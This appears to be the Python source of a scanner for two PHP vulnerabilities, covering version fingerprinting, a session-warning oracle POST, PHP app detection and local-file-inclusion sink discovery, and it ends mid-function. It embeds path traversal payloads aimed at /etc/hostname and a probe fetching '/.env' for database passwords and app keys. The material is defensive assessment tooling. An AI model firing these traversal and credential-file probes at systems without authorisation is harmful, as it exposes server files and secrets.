#!/usr/bin/env python3
"""php2shell scanner — non-destructive detector for CVE-2026-109618 / CVE-2026-109619.

Detection strategy (scanner, NOT exploiter — sends only small benign requests):
  1. PASSIVE version fingerprint: X-Powered-By / Server / X-PHP-Version headers
     (+ optional phpinfo paths) compared against the official fixed releases
     8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. Anything older on a supported branch,
     or any PHP <= 8.1 (EOL, no upstream fix), is LIKELY_VULNERABLE.
  2. ACTIVE oracle (PortSwigger BCheck, Tom SL): one small multipart POST with
     an invalid session id (Cookie: PHPSESSID=_) plus a PHP_SESSION_UPLOAD_PROGRESS
     field. Vulnerable builds echo ALL THREE strings:
       "Session ID is too long or contains illegal characters"
       "Failed to read session data"
       "Failed to write session data ("
     The upstream fix removed that session-write warning path, so patched
     builds stay silent. All three required -> (near-)zero false positives.
     The request is ~300 bytes, triggers no OOM/UAF, no code execution.

References:
  PHP advisories GHSA-w8hw-w9fx-j79w (618) / GHSA-6wmf-4rv5-p3rp (619)
  NCSC-NL/php2shell (operational info), PortSwigger BChecks (oracle),
  CERT-EU 2026-018, Sansec php2shell research.
  See docs/RESEARCH.md for full write-up.
"""
from __future__ import annotations

import argparse
import concurrent.futures
import ipaddress
import json
import os
import random
import re
import socket
import ssl
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import asdict, dataclass, field

TOOL_VERSION = "1.0.0"
UA = f"php2shell-scanner/{TOOL_VERSION} (authorized-security-assessment; scanner-only)"

CVE_618 = "CVE-2026-109618"  # OOM handling -> request cleanup uses invalid data
CVE_619 = "CVE-2026-109619"  # stale request-owned state reused by later request
CVES = (CVE_618, CVE_619)
DISTRO_RE = re.compile(r"(ubuntu|debian\+|\+deb|\.el\d|~dfsg|\.fc\d|suse|amzn|alpine|deb\d)", re.I)

# Minimum FIXED release per supported branch (PHP security release 2026-10-21).
FIXED = {(8, 2): (8, 2, 35), (8, 3): (8, 3, 36), (8, 4): (8, 4, 27), (8, 5): (8, 5, 12)}
PATCHED_URL = "https://www.php.net/archive/2026.php#2026-10-21-5"

DEFAULT_PORTS = (80, 443)
DISCOVERY_PORTS = (80, 443, 8000, 8080, 8443, 8888, 9000, 5000)
COMMON_PHPINFO_PATHS = [
    "/phpinfo.php", "/info.php", "/php_info.php", "/test.php",
    "/pi.php", "/version.php", "/phpversion.php",
]

# Oracle markers — ALL THREE required for a positive (matches PortSwigger check).
ORACLE_MARKERS = (
    "Session ID is too long or contains illegal characters",
    "Failed to read session data",
    "Failed to write session data (",
)

VER_RE = re.compile(r"PHP[/ ](\d+)\.(\d+)(?:\.(\d+))?", re.I)
DISTRO_RE = re.compile(r"(ubuntu|debian|deb\d|\+deb|\.el\d|~dfsg|\.fc\d|suse|amzn|alpine)", re.I)
PHPINFO_VER_RE = re.compile(r"PHP Version\s*(?:</[^>]*>\s*<[^>]*>\s*)?(\d+)\.(\d+)\.(\d+)", re.I)

print_lock = threading.Lock()

# Verbose tracing: -v logs per-endpoint phase lines to stderr (thread-safe,
# ordered per line, never interleaved mid-line); -vv adds per-request lines
# (every GET/POST with method+path+status+ms). Level 0 = findings only.
# Tests assert exact line shapes via run with --verbose (see TestVerbose).
_TRACE_LEVEL = 0
_trace_fh = None
def trace(level: int, msg: str) -> None:
    if _TRACE_LEVEL >= level:
        with print_lock:
            print(msg, flush=True, file=sys.stderr)
            fh = globals().get("_trace_fh")
            if fh is not None:
                try:
                    fh.write(msg + "\n")
                except Exception:
                    pass


def say(msg: str) -> None:
    with print_lock:
        print(msg, flush=True)


def say_recap(findings: list) -> None:
    """TLDR recap: verdict counts, top action, per-host one-liners.
    Printed to stdout after findings (and honors --json? No: --json prints
    raw data only; recap is a human-output feature. JSON consumers aggregate
    verdict fields themselves)."""
    from collections import Counter
    counts: Counter = Counter(f.verdict for f in findings)
    total = len(findings)
    say("=== TLDR ===")
    parts = [f"{v}={counts[v]}" for v in
             ("RCE-PROVEN", "VULNERABLE", "LIKELY_VULNERABLE", "PHP_NO_VERSION",
              "PHP_CANNOT_RULE_OUT", "PHP_UNKNOWN", "PATCHED", "TLS_UNTRUSTED",
              "NO_PHP_SIGNAL", "UNREACHABLE") if counts.get(v)]
    say(f"endpoints={total}" + (f" ({', '.join(parts)})" if parts else ""))
    # top action: worst verdict present decides the headline
    if counts.get("RCE-PROVEN"):
        say("action: CONFIRMED RCE — isolate + patch PHP + remove LFI sink NOW")
    elif counts.get("VULNERABLE"):
        say("action: patch PHP to 8.2.35/8.3.36/8.4.27/8.5.12 NOW, restart workers, re-scan")
    elif counts.get("LIKELY_VULNERABLE"):
        say("action: confirm version, then patch as above (assume vulnerable until proven)")
    elif counts.get("PHP_NO_VERSION") or counts.get("PHP_CANNOT_RULE_OUT"):
        say("action: PHP present but undisclosed — run --local on the box or check vendor advisory")
    elif counts.get("TLS_UNTRUSTED"):
        say("action: TLS blocked verification — re-scan with --insecure to see behind it")
    elif counts.get("PATCHED"):
        say("action: none required (all fingerprinted hosts patched)")
    else:
        say("action: no PHP attack surface observed")
    # per-host one-liners, worst-first (dedupes schemes: https preferred)
    best: dict = {}
    sev = {"RCE-PROVEN": -1, "VULNERABLE": 0, "LIKELY_VULNERABLE": 1,
           "PHP_NO_VERSION": 2, "PHP_CANNOT_RULE_OUT": 2, "PHP_UNKNOWN": 3,
           "PATCHED": 4, "TLS_UNTRUSTED": 5, "NO_PHP_SIGNAL": 6, "UNREACHABLE": 7}
    for f in findings:
        key = (f.host, f.port)
        if key not in best or sev.get(f.verdict, 9) < sev.get(best[key].verdict, 9):
            best[key] = f
    for (h, p), f in sorted(best.items(),
                            key=lambda kv: (sev.get(kv[1].verdict, 9), kv[0][0], kv[0][1])):
        extra = f" PHP {f.php_version}" if f.php_version else ""
        say(f"  {h}:{p} -> {f.verdict}{extra}")


# ---------------------------------------------------------------- versions

BARE_VER_RE = re.compile(r"(\d+)\.(\d+)(?:\.(\d+))?")


def parse_version(text: str) -> tuple[int, int, int] | None:
    """Parse a PHP version ONLY when a PHP token is present (headers).
    The token requirement is deliberate: bare numbers in Server/X-Powered-By
    (Tomcat/8.5.98, Servlet/5.0, WordPress 6.8.3) are NOT PHP versions and
    must never classify. Use parse_strict_version for normalized "x.y[.z]"."""
    if not text:
        return None
    m = VER_RE.search(text)
    if not m:
        return None
    major, minor = int(m.group(1)), int(m.group(2))
    patch = int(m.group(3)) if m.group(3) is not None else 0
    if major < 4 or major > 8 or (major == 8 and minor > 9) or (major == 7 and minor > 4):
        return None
    return (major, minor, patch)


def parse_strict_version(text: str) -> tuple[int, int, int] | None:
    """Parse normalized 'x.y' / 'x.y.z' built by OUR fingerprint layer only
    (never raw header/body text). Callers MUST have established PHP context
    (PHP token header, X-Powered-By PHP/..., phpinfo body match)."""
    if not text:
        return None
    m = BARE_VER_RE.fullmatch(text.strip())
    if not m:
        return None
    major, minor = int(m.group(1)), int(m.group(2))
    patch = int(m.group(3)) if m.group(3) is not None else 0
    if major < 4 or major > 8 or (major == 8 and minor > 9) or (major == 7 and minor > 4):
        return None
    return (major, minor, patch)
def version_has_patch(text: str) -> bool:
    m = VER_RE.search(text or "")
    return bool(m and m.group(3) is not None)


def classify_version(ver: tuple[int, int, int] | None, raw: str = "") -> tuple[str, str]:
    """Return (verdict, detail). Verdicts: PATCHED / LIKELY_VULNERABLE /
    EOL_VULNERABLE / UNKNOWN."""
    if ver is None:
        return ("UNKNOWN", "no parseable PHP version")
    major, minor, patch = ver
    branch = (major, minor)
    if branch in FIXED:
        fixed = FIXED[branch]
        if ver < fixed:
            return ("LIKELY_VULNERABLE",
                    f"PHP {major}.{minor}.{patch} < fixed {'.'.join(map(str, fixed))}")
        return ("PATCHED", f"PHP {major}.{minor}.{patch} >= fixed {'.'.join(map(str, fixed))}")
    if major < 8 or (major == 8 and minor < 2):
        return ("EOL_VULNERABLE",
                f"PHP {major}.{minor}.{patch} is EOL (< 8.2); no upstream fix — check distro backport")
    if branch > (8, 5):
        return ("UNKNOWN", f"branch {major}.{minor} above advisory range; check vendor changelog")
    return ("UNKNOWN", f"PHP {major}.{minor}.{patch}: no advisory mapping")


# ---------------------------------------------------------------- HTTP

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):  # type: ignore[override]
        return None


def make_opener(timeout: float, insecure: bool, cookies: bool = True) -> urllib.request.OpenerDirector:
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    handlers = [urllib.request.HTTPSHandler(context=ctx)]
    if cookies:
        handlers.append(urllib.request.HTTPCookieProcessor())
    handlers.append(NoRedirect())
    return urllib.request.build_opener(*handlers)


def make_bare_opener(timeout: float, insecure: bool) -> urllib.request.OpenerDirector:
    """Cookieless opener: no jar, so Set-Cookie rotation tests see raw server
    behavior instead of the jar swallowing the second mint."""
    return make_opener(timeout, insecure, cookies=False)


def http_request(opener, url: str, timeout: float, method="GET",
                 data: bytes | None = None, headers: dict | None = None,
                 max_bytes: int = 300_000) -> dict:
    import time as _t
    req = urllib.request.Request(url, data=data, headers={
        "User-Agent": UA, "Accept": "*/*", "Connection": "close",
        **(headers or {}),
    }, method=method)
    t0 = _t.monotonic()
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read(max_bytes)
        ms = int((_t.monotonic() - t0) * 1000)
        trace(2, f"req {method} {url} -> {resp.status} ({ms}ms, {len(body)}B)")
        return {"status": resp.status, "headers": dict(resp.headers.items()),
                "body": body.decode("utf-8", "replace"), "url": resp.geturl()}
    except urllib.error.HTTPError as e:
        ms = int((_t.monotonic() - t0) * 1000)
        try:
            body = e.read(60_000)
        except Exception:
            body = b""
        hdrs = dict(e.headers.items()) if e.headers else {}
        trace(2, f"req {method} {url} -> HTTP {e.code} ({ms}ms)")
        out = {"status": e.code, "headers": hdrs,
               "body": body.decode("utf-8", "replace"), "url": url}
        # redirect stub? surface where it points (caller may follow/upgrade)
        if e.code in (301, 302, 303, 307, 308) and hdrs:
            loc = next((v for k, v in hdrs.items() if k.lower() == "location"), "")
            if loc:
                out["redirect_to"] = loc
        return out
    except Exception as e:
        ms = int((_t.monotonic() - t0) * 1000)
        err = f"{type(e).__name__}: {e}"
        trace(2, f"req {method} {url} -> ERROR {type(e).__name__} ({ms}ms)")
        out = {"status": None, "error": err, "url": url}
        # TLS present but untrusted (self-signed appliance)? Tell the operator
        # to retry with --insecure instead of reporting plain UNREACHABLE.
        if "CERTIFICATE_VERIFY_FAILED" in err or "SSL" in type(e).__name__:
            out["tls_untrusted"] = True
        return out


def fingerprint_response(res: dict) -> tuple[str | None, str | None, list[str], bool]:
    """Return (version, source, php_signals, branch_only). branch_only=True when
    a PHP token disclosed only x.y (no patch) — classify() must not fabricate
    x.y.0, so scan_endpoint maps it to EOL_VULNERABLE/UNKNOWN explicitly."""
    signals: list[str] = []
    version, source = None, None
    branch_only = False
    for key in ("x-powered-by", "server", "x-php-version", "x-generator"):
        val = next((v for k, v in res.get("headers", {}).items() if k.lower() == key), None)
        if not val:
            continue
        # Gate: the value itself must name PHP (kills Tomcat/8.5.98, Servlet/5.0,
        # X-AspNet-Version style false hits on the Server header).
        if not re.search(r"php", val, re.I):
            continue
        v = parse_version(val)
        if v:
            version = f"{v[0]}.{v[1]}.{v[2]}"
            source = f"header:{key}"
            branch_only = not version_has_patch(val)
            break
        signals.append(f"header:{key}={val[:80]}")
    set_cookie = next((v for k, v in res.get("headers", {}).items()
                       if k.lower() == "set-cookie"), "")
    if re.search(r"PHPSESSID", set_cookie, re.I):
        signals.append("cookie:PHPSESSID")
    body = res.get("body", "")
    if body:
        if "PHPSESSID" in body:
            signals.append("body:PHPSESSID")
        if re.search(r'\.php["\'\s>]', body):
            signals.append("body:.php-link")
        for app, rx in APP_BODY_RX:
            if rx.search(body):
                signals.append(f"body:app-{app}")
        m = PHPINFO_VER_RE.search(body)
        if m and version is None:
            version = f"{m.group(1)}.{m.group(2)}.{m.group(3)}"
            source = "body:phpinfo"
        elif re.search(r"phpinfo\(\)|PHP Version", body):
            signals.append("body:phpinfo-marker")
        # Bare "Powered by PHP x.y.z" style text: PHP context present, version
        # extracted from a PHP-token match only.
        if version is None:
            pm = re.search(r"php[^0-9]{0,20}(\d+\.\d+(?:\.\d+)?)", body, re.I)
            if pm:
                pv = parse_version("PHP " + pm.group(1))
                if pv:
                    version = f"{pv[0]}.{pv[1]}.{pv[2]}"
                    source = "body:powered-by"
                    branch_only = "." not in pm.group(1).strip() or pm.group(1).count(".") == 1
    return version, source, signals, branch_only


# PHP-only application fingerprints: each app below runs EXCLUSIVELY on PHP,
# so observing it proves a PHP runtime even with zero version disclosure.
# (name, body-regex, well-known probe path returning app-specific content)
APP_BODY_RX = [
    ("wordpress", re.compile(r"wp-content|wp-includes|/wp-json/|wordpress", re.I)),
    ("laravel", re.compile(r"laravel|_token|csrf-token", re.I)),
    ("drupal", re.compile(r"drupal|sites/default/files|Drupal\.settings", re.I)),
    ("joomla", re.compile(r"joomla|/media/jui/|com_content", re.I)),
    ("phpmyadmin", re.compile(r"phpmyadmin|pma_|PhpMyAdmin", re.I)),
    ("nextcloud", re.compile(r"nextcloud|/apps/files/|ocs-provider", re.I)),
    ("owncloud", re.compile(r"owncloud", re.I)),
    ("mediawiki", re.compile(r"mediawiki|mw-config|/load\.php", re.I)),
    ("symfony", re.compile(r"symfony|_wdt|/bundles/", re.I)),
    ("codeigniter", re.compile(r"codeigniter|ci_session", re.I)),
    ("magento", re.compile(r"magento|/static/version|mage/cookies", re.I)),
    ("prestashop", re.compile(r"prestashop", re.I)),
    ("matomo", re.compile(r"matomo|piwik", re.I)),
    # Hosting panels (PHP UIs; version = panel build, PHP runtime underneath).
    ("plesk", re.compile(r"plesk|sw-cp-server|psa-page", re.I)),
    ("cpanel", re.compile(r"cPanel|WHM|cpanel.*login|/cpsess", re.I)),
    ("whmcs", re.compile(r"whmcs|WHMCompleteSolution", re.I)),
    ("passbolt", re.compile(r"passbolt", re.I)),
    ("coolify", re.compile(r"coolify", re.I)),
    # Network/security appliances with PHP management UIs.
    ("panos", re.compile(r"pan-os|panorama|palo\s?alto", re.I)),
    ("pfsense", re.compile(r"pfSense", re.I)),
    ("opnsense", re.compile(r"OPNsense", re.I)),
    ("synology", re.compile(r"synology|diskstation", re.I)),
    ("qnap", re.compile(r"qnap|QTS", re.I)),
    ("freenas", re.compile(r"freenas|truenas", re.I)),
]

# Safe active probes: each is a normal GET a browser/crawler would issue.
# Easter-egg GUIDs (?=PHPxxxxxx) are compiled into every PHP binary and
# answered WITHOUT executing app code — but ONLY when expose_php=On AND the
# request reaches the PHP handler. No POST, no upload, no state change.
EGG_PROBES = (
    # (query, marker-in-response, description)
    ("?=PHPE9568F36-D428-11d2-A769-00AA001ACF42", "PHP Logo", "php-logo GUID"),
    ("?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000", "Zend Logo", "zend-logo GUID"),
)

# Well-known app endpoints that prove a PHP app serves this host. All plain
# GETs of public files; 200 + content match required (status alone is not
# evidence — custom 404 pages return 200 on some stacks).
APP_PROBES = (
    # (path, must-match-rx, signal)
    ("/wp-login.php", re.compile(r"wordpress|wp-", re.I), "app-wordpress:wp-login.php"),
    ("/wp-includes/version.php", re.compile(r"\$wp_version\s*=", re.I), "app-wordpress:version.php"),
    ("/xmlrpc.php", re.compile(r"XML-RPC|xmlrpc", re.I), "app-wordpress:xmlrpc.php"),
    # Static WP assets: served without PHP/DB, but path+content is WP-only
    # (proves a PHP app is deployed even when PHP itself stays silent).
    ("/wp-includes/js/jquery/jquery.min.js", re.compile(r"jquery", re.I), "app-wordpress:static-asset"),
    ("/readme.html", re.compile(r"wordpress", re.I), "app-wordpress:readme"),
    ("/phpmyadmin/index.php", re.compile(r"phpmyadmin|pma", re.I), "app-phpmyadmin:index"),
    ("/phpMyAdmin/index.php", re.compile(r"phpmyadmin|pma", re.I), "app-phpmyadmin:index"),
    ("/index.php/login", re.compile(r"nextcloud|owncloud", re.I), "app-nextcloud:login"),
    ("/status.php", re.compile(r'"(version|productname)"', re.I), "app-nextcloud:status"),
    ("/mediawiki/load.php", re.compile(r"mediawiki|mw", re.I), "app-mediawiki:load"),
    ("/user/login", re.compile(r"drupal", re.I), "app-drupal:login"),
    # Hosting panels: login pages + static assets prove the PHP UI. Version
    # regexes capture the PANEL build (drives vendor-advisory lookup); the
    # PHP runtime underneath is what php2shell cares about.
    ("/login.php", re.compile(r"plesk|sw-cp-server", re.I), "app-plesk:login"),
    ("/cpanel", re.compile(r"cPanel|WHM|login", re.I), "app-cpanel:redirect"),
    ("/clientarea.php", re.compile(r"whmcs", re.I), "app-whmcs:clientarea"),
    ("/auth/login", re.compile(r"passbolt", re.I), "app-passbolt:login"),
    # Appliance management UIs (PHP-backed; locked-down, no version headers).
    ("/php/login.php", re.compile(r"pan-os|panorama|palo", re.I), "app-panos:login"),
    ("/api/system/status", re.compile(r"opnsense|qnap|synology", re.I), "app-appliance:status"),
)

# Panel/appliance VERSION extraction: (signal-prefix, rx with group(1)=version).
# Panel build -> vendor advisory lookup (Plesk/cPanel ship dated PHP rebuilds).
PANEL_VERSION_RX = (
    ("app-plesk", re.compile(r"Plesk\s+(?:Obsidian\s+)?(\d+\.\d+\.\d+)", re.I)),
    ("app-cpanel", re.compile(r"cPanel\s+(\d+\.\d+\.\d+)", re.I)),
    ("app-passbolt", re.compile(r"passbolt[^0-9]*(\d+\.\d+\.\d+)", re.I)),
    ("app-panos", re.compile(r"PAN-OS\s+(\d+\.\d+\.\d+)", re.I)),
)


ORACLE_PATHS = ("/", "/index.php")

def build_oracle_body(boundary: str, token: str, fname: str) -> bytes:
    parts = [
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{token}\r\n",
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"{fname}\"\r\nContent-Type: text/plain\r\n\r\n1\r\n",
        f"--{boundary}--\r\n",
    ]
    return "".join(parts).encode()

# Candidate PHP paths: probed with a harmless GET first; only paths that
# actually execute PHP (PHP-specific content-type or dynamic behavior — NOT
# status alone) get the oracle POST. This is how a vague hardened box with
# PHP hiding at /app.php gets found without spraying POSTs everywhere.
PHP_PATH_CANDIDATES = (
    "/", "/index.php", "/app.php", "/search.php", "/api.php", "/ajax.php",
    "/login.php", "/admin.php", "/wp-login.php", "/xmlrpc.php",
)


def looks_like_php_response(res: dict, body_hint: str = "") -> bool:
    """Heuristic: does this GET response prove the path runs PHP?
    Positive signals: X-Powered-By PHP, PHPSESSID cookie, .php in Location,
    or body differing from a static file (query reflection counts)."""
    if res.get("status") not in (200, 500):
        return False
    for k, v in res.get("headers", {}).items():
        kl = k.lower()
        if kl == "x-powered-by" and "php" in str(v).lower():
            return True
        if kl == "set-cookie" and "phpsessid" in str(v).lower():
            return True
        if kl == "location" and ".php" in str(v).lower():
            return True
    return False


def discover_php_paths(opener, url: str, timeout: float,
                       spider_pages: int = 10, spider_depth: int = 2) -> list[str]:
    """GET each candidate path; return paths proving PHP execution.
    Candidates = bounded spider crawl (site's own links, spider_depth clicks
    down, spider_pages cap) + static guesses + conventional fallbacks.
    Proof = X-Powered-By PHP, PHPSESSID cookie, .php redirect, or dynamic
    query reflection. All safe GETs."""
    base = url.rstrip("/")
    found: list[str] = []
    probe_token = "p2s" + "".join(random.choice("abcdef0123456789") for _ in range(8))
    try:
        spider_targets, _ = spider_site(opener, url, min(timeout, 6.0),
                                        max_pages=spider_pages, max_depth=spider_depth)
    except Exception:
        spider_targets = set()
    try:
        crawled = harvest_php_links(opener, url, timeout)
    except Exception:
        crawled = []
    ordered = list(dict.fromkeys(sorted(spider_targets) + crawled + list(PHP_PATH_CANDIDATES) + list(CONVENTIONAL_PHP)))
    trace(1, f"discover {base}: {len(spider_targets)} spider + {len(crawled)} harvest + "
              f"{len(PHP_PATH_CANDIDATES) + len(CONVENTIONAL_PHP)} static candidates")
    for p in ordered[:40]:  # cap: spider first, static guesses after
        target = base + p if p != "/" else url
        try:
            res = http_request(opener, target, timeout)
            if res.get("status") == 404:
                continue  # no such path — never a PHP endpoint here
            if looks_like_php_response(res):
                found.append(p)
                trace(1, f"discover {base}{p}: PHP-PROVEN (header/cookie/redirect)")
                continue
            if res.get("status") == 200 and p.endswith(".php"):
                body1 = res.get("body") or ""
                # dynamic probes: bare random param, common consumed names
                # (?q/?s/?id/?action/?page/?p — endpoints ignore unknown params
                # but output changes with a consumed one), reflection first.
                r2 = http_request(opener, target + f"?{probe_token}=1", timeout)
                body2 = r2.get("body") or ""
                if r2.get("status") == 200 and probe_token in body2:
                    found.append(p)  # reflected token → code executed
                    trace(1, f"discover {base}{p}: PHP-PROVEN (query reflection)")
                    continue
                if body2 != body1:
                    found.append(p)  # query changed output → dynamic handler
                    trace(1, f"discover {base}{p}: PHP-PROVEN (dynamic output)")
                    continue
                for qn in ("q", "s", "id", "action", "page", "p"):
                    r3 = http_request(opener, target + f"?{qn}={probe_token}", timeout)
                    body3 = r3.get("body") or ""
                    if r3.get("status") == 200 and (probe_token in body3 or body3 != body1):
                        found.append(p)  # consumed ?qn= → dynamic handler
                        trace(1, f"discover {base}{p}: PHP-PROVEN (?{qn}= dynamic)")
                        break
                else:
                    continue
                continue
        except Exception:
            continue
    # / always tried (oracle is harmless); discovered .php paths added
    paths = ["/"] + [p for p in found if p != "/"]
    return paths


# LFI sink discovery: candidate (path, param) pairs where a query parameter
# MIGHT feed include/require. Sources, in order (no per-app knowledge):
#   1. crawled pages' <form> inputs + ?param= links (the site names its own),
#   2. conventional include-ish param names on discovered .php paths,
#   3. static (path, param) guesses as last resort.
# Validation is INERT: baseline `?param=<benign>` vs traversal
# `?param=<benign>../../../../etc/hostname` — a sink reflects file CONTENT
# (hostname text) or changes status/length class WITHOUT executing anything.
# Only validated sinks are returned. All plain GETs.
LFI_PARAM_NAMES = ("page", "file", "path", "include", "template", "lang",
                   "view", "content", "doc", "module", "action")
TRAVERSALS = ("../../../../etc/hostname", "..%2f..%2f..%2f..%2fetc%2fhostname")
FORM_INPUT_RX = re.compile(r'''<input[^>]+name\s*=\s*["']([^"'#>]+)["']''', re.I)
FORM_ACTION_RX = re.compile(r'''<form[^>]+action\s*=\s*["']([^"'#>]+)["']''', re.I)
LINK_PARAM_RX = re.compile(r'''href\s*=\s*["']([^"'#>?]+\.php\?[^"'#>]+)["']''', re.I)


def harvest_lfi_params(body: str | None) -> set[str]:
    """Param names from <form> inputs on a page. Pure function of HTML."""
    found: set[str] = set()
    if not body:
        return found
    for m in FORM_INPUT_RX.finditer(body):
        name = m.group(1).strip().lower()
        if name and len(name) < 32 and name not in ("q", "s", "search", "csrf", "_token"):
            found.add(m.group(1).strip())
    return found


def discover_lfi_sinks(opener, url: str, timeout: float,
                       php_paths: list[str] | None = None,
                       spider_pages: int = 10, spider_depth: int = 2) -> list[tuple[str, str]]:
    """Return validated [(path, param)] LFI candidates. Inert validation only:
    benign-vs-traversal response delta (file content reflected or class change),
    never executing injected code. All plain GETs."""
    from urllib.parse import quote, urlparse
    base = url.rstrip("/")
    if php_paths is None:
        try:
            php_paths = discover_php_paths(opener, url, timeout, spider_pages, spider_depth)
        except Exception:
            php_paths = ["/"]
    # candidate params: site's own form inputs + conventional names
    params: set[str] = set(LFI_PARAM_NAMES)
    link_targets: list[str] = []
    try:
        _, visited = spider_site(opener, url, min(timeout, 6.0),
                                 max_pages=spider_pages, max_depth=spider_depth)
        _ = visited
    except Exception:
        pass
    try:
        res0 = http_request(opener, url, timeout)
        params |= harvest_lfi_params(res0.get("body"))
    except Exception:
        pass
    # candidate (path, param): EVERY discovered .php path x every param
    # (the sink is usually NOT the landing page — lab vuln.php is only
    # reachable because the spider/static guesses name it), plus crawled
    # ?param links first (site names its own sink+param).
    cands: list[tuple[str, str]] = []
    lfi_guess_paths = ["/vuln.php", "/include.php", "/page.php", "/view.php", "/show.php"]
    for p in (php_paths or ["/"])[:12]:
        for pn in sorted(params):
            cands.append((p if p != "/" else "/index.php", pn))
    for gp in lfi_guess_paths:
        for pn in sorted(params):
            cands.append((gp, pn))
    try:
        r = http_request(opener, url, timeout)
        for m in LINK_PARAM_RX.finditer(r.get("body") or ""):
            href = m.group(1)
            try:
                u = urlparse(href if "://" in href else base + (href if href.startswith("/") else "/" + href))
                q = urllib.parse.parse_qsl(u.query)
                if q:
                    cands.insert(0, (u.path or "/", q[0][0]))
            except Exception:
                continue
    except Exception:
        pass
    validated: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for path, pn in cands[:30]:  # budget cap
        if (path, pn) in seen:
            continue
        seen.add((path, pn))
        try:
            b = http_request(opener, f"{base}{path}?{pn}={quote('p2sbaseline', safe='')}", timeout)
            if b.get("status") not in (200, 500):
                continue
            body1 = b.get("body") or ""
            for trav in TRAVERSALS:
                t = http_request(opener, f"{base}{path}?{pn}={quote(trav, safe='')}", timeout)
                if t.get("status") not in (200, 500):
                    continue
                body2 = t.get("body") or ""
                # file content reflected? /etc/hostname is one short token line
                if body2 != body1 and (len(body2) // 512 != len(body1) // 512 or "localhost" in body2.lower()
                                       or re.search(r"^[a-z0-9][a-z0-9\-\.]{0,60}$", body2.strip(), re.M)):
                    validated.append((path, pn))
                    trace(1, f"lfi {base}{path}?{pn}=: SINK-VALIDATED (traversal delta)")
                    break
        except Exception:
            continue
    trace(1, f"lfi {base}: {len(validated)} validated sink(s) from {len(seen)} candidates")
    return validated


def run_oracle(opener, url: str, timeout: float, spider_pages: int = 10,
               spider_depth: int = 2) -> tuple[bool, str]:
    """Return (positive, evidence). Discovers PHP-executing paths via safe
    GETs (site's own harvested .php links first, then static guesses), then
    POSTs the tiny oracle to each. Positive requires ALL THREE markers on any
    path (matches PortSwigger check)."""
    base = url.rstrip("/")
    last_ev = "not run"
    try:
        paths = discover_php_paths(opener, url, timeout, spider_pages, spider_depth)
    except Exception:
        paths = list(ORACLE_PATHS)
    for p in paths:
        target = base + p if p != "/" else url
        boundary = "----p2s" + "".join(random.choice("abcdef0123456789") for _ in range(24))
        token = "".join(random.choice("abcdef0123456789") for _ in range(20))
        fname = "".join(random.choice("abcdef0123456789") for _ in range(12)) + ".txt"
        body = build_oracle_body(boundary, token, fname)
        res = http_request(opener, target, timeout, method="POST", data=body, headers={
            "Cookie": "PHPSESSID=_",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        })
        text = res.get("body", "")
        hits = [m for m in ORACLE_MARKERS if m in text]
        last_ev = (f"oracle markers {len(hits)}/{len(ORACLE_MARKERS)}"
                   + (f": {hits}" if hits else "") + f" (HTTP {res.get('status')}, path {p})")
        trace(1, f"oracle {base}{p}: {len(hits)}/3 markers (HTTP {res.get('status')})")
        if len(hits) == len(ORACLE_MARKERS):
            return True, last_ev
    trace(1, f"oracle {base}: negative across {len(paths)} path(s)")
    return False, last_ev


def run_easter_eggs(opener, url: str, timeout: float) -> tuple[bool, str]:
    """GET ?=PHP<GUID> easter eggs. Positive only on image/gif + logo marker.
    Safe: plain GET handled inside the PHP binary (no app code, no state)."""
    base = url.rstrip("/")
    for q, marker, desc in EGG_PROBES:
        res = http_request(opener, base + "/" + q, timeout)
        if res.get("status") != 200:
            continue
        ctype = next((v for k, v in res.get("headers", {}).items()
                      if k.lower() == "content-type"), "")
        if "image" not in ctype.lower():
            continue
        if len(res.get("body", "")) > 100:  # GIF bytes decode large; any real image body qualifies
            return True, f"easter-egg {desc} ({ctype})"
    return False, "easter-eggs absent (expose_php=Off or non-PHP handler)"


def run_app_probes(opener, url: str, timeout: float,
                   max_probes: int = 25) -> tuple[list[str], list[str], dict]:
    """GET well-known PHP-app endpoints. Returns (hits, tried, panel_versions).
    A hit needs HTTP 200 AND app-specific content (never status alone).
    panel_versions maps signal -> panel build string where extractable."""
    base = url.rstrip("/")
    hits: list[str] = []
    panel_versions: dict = {}
    tried = 0
    for path, rx, signal in APP_PROBES[:max_probes]:
        tried += 1
        try:
            res = http_request(opener, base + path, timeout)
        except Exception:
            continue
        body = res.get("body") or ""
        if res.get("status") == 200 and body and rx.search(body):
            hits.append(signal)
            for prefix, vrx in PANEL_VERSION_RX:
                if signal.startswith(prefix):
                    m = vrx.search(body)
                    if m:
                        panel_versions[signal] = m.group(1)
    return hits, [p for p, _, _ in APP_PROBES[:max_probes]], panel_versions


# Deployment droppings: files that exist ONLY beside a PHP deployment.
# 200 + content match required (a 404 page with 200 status is not evidence).
DEPLOY_PROBES = (
    # (path, must-match-rx, signal)
    ("/composer.json", re.compile(r'"(require|autoload|name)"\s*:', re.I), "deploy:composer.json"),
    ("/composer.lock", re.compile(r'"(packages|content-hash)"', re.I), "deploy:composer.lock"),
    ("/.env", re.compile(r"(APP_KEY|DB_PASSWORD|APP_ENV)=", re.I), "deploy:dotenv"),
    ("/server.php", re.compile(r"laravel|symfony|public/index", re.I), "deploy:server.php"),
    ("/artisan", re.compile(r"laravel|artisan", re.I), "deploy:artisan"),
)


def run_deploy_probes(opener, url: str, timeout: float) -> list[str]:
    """GET deployment-dropping files. Returns hit signals. Safe plain GETs."""
    base = url.rstrip("/")
    hits: list[str] = []
    for path, rx, signal in DEPLOY_PROBES:
        try:
            res = http_request(opener, base + path, timeout)
        except Exception:
            continue
        if res.get("status") == 200 and res.get("body") and rx.search(res["body"]):
            hits.append(signal)
    return hits


def run_404_differential(opener, url: str, timeout: float) -> tuple[bool, str]:
    """GET /.php vs /.<rand> — if the server treats '*.php' differently from
    an unknown extension (different status, length class, or content-type),
    SOMETHING parses .php — a handler exists. Safe plain GETs, no payload."""
    base = url.rstrip("/")
    token = "".join(random.choice("abcdef0123456789") for _ in range(12))
    try:
